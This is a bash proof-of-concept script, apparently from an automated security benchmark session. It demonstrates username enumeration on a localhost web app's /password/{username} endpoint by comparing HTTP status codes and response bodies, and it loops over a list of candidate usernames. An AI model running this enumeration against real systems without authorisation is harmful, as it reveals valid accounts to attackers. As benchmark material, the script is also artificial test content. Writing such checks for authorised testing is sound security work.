#!/bin/bash
# POC: Demonstrates user enumeration via HTTP status code differences on /password/{username} endpoint. Valid usernames return 200, invalid return 302.
# Target: ./repo
# Created: 2025-11-04T14:35:49.945Z
# Session: benchmark-XBEN-027-24-mhknolag

# User Enumeration via HTTP Status Codes - Password Endpoint POC
# This script demonstrates how attackers can enumerate valid usernames
# by testing the /password/{username} endpoint and checking HTTP response codes

TARGET_URL="http://localhost:8080"
VALID_USER="test"
INVALID_USER="invaliduser123xyz"

echo "=========================================="
echo "User Enumeration via Password Endpoint"
echo "=========================================="
echo ""

# Test 1: Valid username
echo "[*] Test 1: Testing VALID username: $VALID_USER"
echo "Command: curl -i \"$TARGET_URL/password/$VALID_USER\" 2>/dev/null | head -1"
RESPONSE=$(curl -i "$TARGET_URL/password/$VALID_USER" 2>/dev/null | head -1)
echo "Response: $RESPONSE"
STATUS=$(echo "$RESPONSE" | awk '{print $2}')
echo "HTTP Status Code: $STATUS"
echo ""

# Test 2: Invalid username
echo "[*] Test 2: Testing INVALID username: $INVALID_USER"
echo "Command: curl -i \"$TARGET_URL/password/$INVALID_USER\" 2>/dev/null | head -1"
RESPONSE=$(curl -i "$TARGET_URL/password/$INVALID_USER" 2>/dev/null | head -1)
echo "Response: $RESPONSE"
STATUS=$(echo "$RESPONSE" | awk '{print $2}')
echo "HTTP Status Code: $STATUS"
echo ""

# Test 3: Demonstrate the body content difference
echo "[*] Test 3: Checking response body for valid user:"
echo "Command: curl -s \"$TARGET_URL/password/$VALID_USER\" | grep -o 'Welcome\\|not found' | head -1"
BODY=$(curl -s "$TARGET_URL/password/$VALID_USER" | grep -o 'Welcome\|not found' | head -1)
echo "Found: $BODY"
echo ""

# Test 4: Demonstrate the body content difference for invalid user
echo "[*] Test 4: Checking response for invalid user:"
echo "Command: curl -s \"$TARGET_URL/password/$INVALID_USER\" | grep -o 'not found\\|Location' | head -1"
BODY=$(curl -s "$TARGET_URL/password/$INVALID_USER" | grep -i 'not found' | head -1)
if [ -z "$BODY" ]; then
  LOCATION=$(curl -i "$TARGET_URL/password/$INVALID_USER" 2>/dev/null | grep -i 'location' | head -1)
  echo "Redirect found: $LOCATION"
else
  echo "Found: $BODY"
fi
echo ""

# Test 5: Automated enumeration attack simulation
echo "[*] Test 5: Simulating automated enumeration attack:"
echo "Testing multiple usernames to identify valid accounts..."
USERNAMES=("test" "admin" "user" "invaliduser123" "notauser456")
VALID_USERS=()

for username in "${USERNAMES[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/password/$username" 2>/dev/null)
  if [ "$STATUS" = "200" ]; then
    echo "  ✓ $username - HTTP $STATUS (VALID USER FOUND)"
    VALID_USERS+=("$username")
  else
    echo "  ✗ $username - HTTP $STATUS"
  fi
done

echo ""
echo "=========================================="
echo "Enumeration Results:"
echo "Valid users found: ${VALID_USERS[*]}"
echo "=========================================="
echo "Vulnerability: HTTP status codes leak user existence"
echo "All attackers need is HTTP status code checking"
echo "No authentication or rate limiting present"